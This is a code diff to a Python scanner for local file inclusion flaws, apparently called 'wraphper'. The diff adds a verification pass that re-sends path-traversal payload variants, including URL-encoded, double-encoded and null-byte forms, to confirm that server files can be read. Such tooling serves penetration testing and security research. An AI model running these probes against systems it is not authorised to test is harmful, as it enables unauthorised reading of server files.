             if self.verbose and analysis['confidence'] > 0.3:
                 snippet_info = f"\033[90m | Content: {analysis['content_snippet']}\033[0m" if analysis.get('content_snippet') else ""
                 print(f"\n\033[90m[*] {payload[:60]} | {response.status_code} | {analysis['vulnerability_type']} | {analysis['confidence']:.2f}{snippet_info}\033[0m")
-            if analysis['vulnerability_type'] and analysis['confidence'] > 0.6:
+            
+            # If confidence above threshold, add to candidate list (not final yet)
+            if analysis['vulnerability_type'] and analysis['confidence'] > 0.5:
                 with self.lock:
-                    finding = Finding(payload=payload, vuln_type=analysis['vulnerability_type'], confidence=analysis['confidence'], details=analysis['details'], url=full_url, content_snippet=analysis.get('content_snippet', ''))
-                    self.findings.append(finding)
-                    color = "\033[92m" if analysis['confidence'] > 0.8 else "\033[93m"
-                    snippet_str = f"\n\033[96m   Content: {finding.content_snippet}\033[0m" if finding.content_snippet else ""
-                    print(f"\n{color}[+] {finding.vuln_type} -> {payload}{snippet_str}\033[0m")
+                    finding = Finding(
+                        payload=payload,
+                        vuln_type=analysis['vulnerability_type'],
+                        confidence=analysis['confidence'],
+                        details=analysis['details'],
+                        url=full_url,
+                        content_snippet=analysis.get('content_snippet', ''),
+                        verified=False
+                    )
+                    candidate_list.append(finding)
         except Exception as e:
             if self.verbose:
                 print(f"\n\033[91m[!] Error: {str(e)[:50]}\033[0m")
         time.sleep(self.delay)
+    
+    def verify_candidates(self, url: str, param: str, candidates: List[Finding]) -> List[Finding]:
+        """Verify each candidate by sending additional payloads for the same target file."""
+        if self.no_validation:
+            return candidates
+        verified = []
+
+        for cand in candidates:
+
+            target = None
+            for known in PayloadGenerator.FILE_TARGETS:
+                if known in cand.payload:
+                    target = known
+                    break
+            if not target:
+                # If not found, use the payload itself as target (just in case)
+                target = cand.payload[:50]  # fallback
+            
+            # Generate verification payloads: different traversal depths/encodings for same target
+            verif_payloads = []
+            if target:
+                # Use a subset of path variants and null byte variants
+                pg = PayloadGenerator(custom_files=[target], intensity=self.intensity)
+                # Generate a few variants (limit to 10 to avoid flooding)
+                for pl in pg.generate():
+                    if pl not in [cand.payload]:  # avoid duplicate of the original
+                        verif_payloads.append(pl)
+                        if len(verif_payloads) >= 10:
+                            break
+            
+            # If no specific target, just use the original payload with different encodings
+            if not verif_payloads:
+                # Try to generate some variations of the payload itself
+                orig = cand.payload
+                for enc in ['', urllib.parse.quote(orig, safe='%'), urllib.parse.quote(urllib.parse.quote(orig, safe='%'), safe='%')]:
+                    if enc and enc != orig:
+                        verif_payloads.append(enc)
+                # Add some null byte variations
+                for null in ['%00', '\x00', '%2500']:
+                    verif_payloads.append(orig + null)
+            
+            # Send verification payloads and count successes
+            success_count = 0
+            for vp in verif_payloads[:5]:  # limit to 5 verification attempts per candidate
+                if self.stop:
+                    break
+                try:
+                    safe_vp = urllib.parse.quote(vp, safe='%')
+                    if self.method == "GET":
+                        parsed = urlparse(url)
+                        query_params = parse_qs(parsed.query)
+                        query_params[param] = [safe_vp]
+                        new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
+                        full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+                        resp = self.client.get(full_url)
+                    else:
+                        body_data = self.post_data.copy()
+                        body_data[param] = safe_vp
+                        body = "&".join([f"{k}={v}" for k, v in body_data.items()])
+                        resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                    if resp:
+                        analysis = ResponseAnalyzer.analyze(resp.text, dict(resp.headers), self.baseline)
+                        if analysis['vulnerability_type'] and analysis['confidence'] > 0.5:
+                            success_count += 1
+                except:
+                    pass
+                time.sleep(self.delay * 0.5)
+            
+            # if at least 2 out of 5 verification attempts succeed, consider it verified
+            if success_count >= 2:
+                cand.verified = True
+                verified.append(cand)
+            else:
+                if self.verbose:
+                    print(f"\033[90m[*] Verification failed for {cand.payload[:40]} (only {success_count} successes)\033[0m")
+        
+        return verified
     
     def scan(self, url: str, param: str):
         print(f"\033[96m[*] Target: {url}\033[0m")
@@ -714,7 +965,20 @@ class LFIScanner:
         if self.target_files:
             print(f"\033[96m[*] Custom files: {len(self.target_files)}\033[0m")
         print()
-        payload_generator = PayloadGenerator(custom_files=self.target_files, target_dir=self.target_dir, intensity=self.intensity, smart_mode=self.smart_mode, doc_root=self.doc_root)
+        
+        # pls work this time
+        print("\033[96m[*] Establishing baseline...\033[0m")
+        self.establish_baseline(url, param)
+        if not self.baseline:
+            print("\033[91m[!] Failed to establish baseline. Continuing anyway.\033[0m")
+        
+        payload_generator = PayloadGenerator(
+            custom_files=self.target_files,
+            target_dir=self.target_dir,
+            intensity=self.intensity,
+            smart_mode=self.smart_mode,
+            doc_root=self.doc_root
+        )
         seen = set()
         payloads = []
         for pl in payload_generator.generate():
@@ -724,6 +988,9 @@ class LFIScanner:
                 if len(payloads) > 50000:
                     break
         print(f"\033[96m[*] Generated {len(payloads)} unique payloads\033[0m\n")
+        
+        # 1st pass: collect candidates
+        candidates: List[Finding] = []
         animator = ProgressAnimator(self)
         animator.start()
         try:
@@ -732,16 +999,38 @@ class LFIScanner:
                 for payload in payloads:
                     if self.stop:
                         break
-                    futures.append(executor.submit(self.scan_payload, url, param, payload))
+                    futures.append(executor.submit(self.scan_payload, url, param, payload, candidates))
                 for future in as_completed(futures):
                     if self.stop:
                         break
         finally:
             animator.running = False
             print()
-            self.summary()
-            if self.output_file:
-                self.save_results()
+        
+        if self.stop:
+            print("\033[93m[!] Scan interrupted.\033[0m")
+            self.save_results()
+            return
+        
+        # report initial suspect
+        print(f"\033[96m[*] Found {len(candidates)} candidate(s) with confidence > 0.5\033[0m")
+        if not candidates:
+            print("\033[91m[-] No candidates found. Exiting.\033[0m")
+            self.save_results()
+            return
+        
+        # 2nd pass: verify candidates
+        if not self.no_validation:
+            print("\033[96m[*] Starting verification phase...\033[0m")
+            verified_findings = self.verify_candidates(url, param, candidates)
+            print(f"\033[96m[*] Verified {len(verified_findings)} finding(s)\033[0m")
+            self.findings = verified_findings
+        else:
+            self.findings = candidates
+        
+        self.summary()
+        if self.output_file:
+            self.save_results()
     
     def summary(self):
         print("\n\033[95m=== SUMMARY ===\033[0m")
@@ -749,7 +1038,8 @@ class LFIScanner:
         print(f"Findings: {len(self.findings)}")
         if self.findings:
             for f in self.findings:
-                print(f"{f.vuln_type}: {f.payload}")
+                verified_mark = " \033[92m[VERIFIED]\033[0m" if f.verified else ""
+                print(f"{f.vuln_type} (conf={f.confidence:.2f}){verified_mark}: {f.payload}")
                 if f.content_snippet:
                     print(f"  Content: {f.content_snippet}")
         else:
@@ -767,11 +1057,11 @@ def main():
     parser.add_argument("--follow-redirects", action="store_true")
     parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
     parser.add_argument("--timeout", type=int, default=10)
-    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
+    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="Change request method")
     parser.add_argument("--data", help="POST data")
     parser.add_argument("--cookie", help="Session cookies")
-    parser.add_argument("--header", action="append", help="Custom headers")
-    parser.add_argument("--user-agent", default="wraphper/1.0", help="Custom User-Agent")
+    parser.add_argument("--header", action="append", help="Add custom headers")
+    parser.add_argument("--user-agent", default="wraphper/2.0", help="Custom User-Agent")
     parser.add_argument("--target-file", action="append", help="Target specific file")
     parser.add_argument("--target-dir", help="Target specific directory")
     parser.add_argument("--target-list", help="File with list of targets")
@@ -779,8 +1069,10 @@ def main():
     parser.add_argument("--output", help="Save results to JSON file")
     parser.add_argument("--verbose", "-v", action="store_true")
     parser.add_argument("--smart", action="store_true", help="Smart mode: use path disclosures to optimize payloads")
+    parser.add_argument("--no-validation", action="store_true", help="Skip verification phase (faster but less accurate)")
     args = parser.parse_args()
     Banner.show()
+    
     target_files = []
     if args.target_file:
         target_files.extend(args.target_file)
@@ -793,27 +1085,55 @@ def main():
             return
     if args.target_dir:
         target_files.append(args.target_dir)
+    
     cookies = {}
     if args.cookie:
         for cookie in args.cookie.split(';'):
             if '=' in cookie:
                 key, value = cookie.strip().split('=', 1)
                 cookies[key] = value
+    
     headers = {}
     if args.header:
         for header in args.header:
             if ':' in header:
                 key, value = header.split(':', 1)
                 headers[key.strip()] = value.strip()
+    
     post_data = {}
     if args.data:
         for pair in args.data.split('&'):
             if '=' in pair:
                 key, value = pair.split('=', 1)
                 post_data[key] = value
-    client = HTTPClient(proxy=args.proxy, follow_redirects=args.follow_redirects, verify_ssl=not args.insecure, cookies=cookies, headers=headers, timeout=args.timeout, user_agent=args.user_agent)
-    scanner = LFIScanner(client, delay=args.delay, threads=args.threads, method=args.method, post_data=post_data, target_files=target_files if target_files else None, target_dir=args.target_dir, intensity=args.intensity, output_file=args.output, verbose=args.verbose, smart_mode=args.smart)
+    
+    client = HTTPClient(
+        proxy=args.proxy,
+        follow_redirects=args.follow_redirects,
+        verify_ssl=not args.insecure,
+        cookies=cookies,
+        headers=headers,
+        timeout=args.timeout,
+        user_agent=args.user_agent,
+        max_retries=2
+    )
+    
+    scanner = LFIScanner(
+        client=client,
+        delay=args.delay,
+        threads=args.threads,
+        method=args.method,
+        post_data=post_data,
+        target_files=target_files if target_files else None,
+        target_dir=args.target_dir,
+        intensity=args.intensity,
+        output_file=args.output,
+        verbose=args.verbose,
+        smart_mode=args.smart,
+        no_validation=args.no_validation
+    )
     scanner.scan(args.url, args.param)
+
 
 if __name__ == "__main__":
     main()
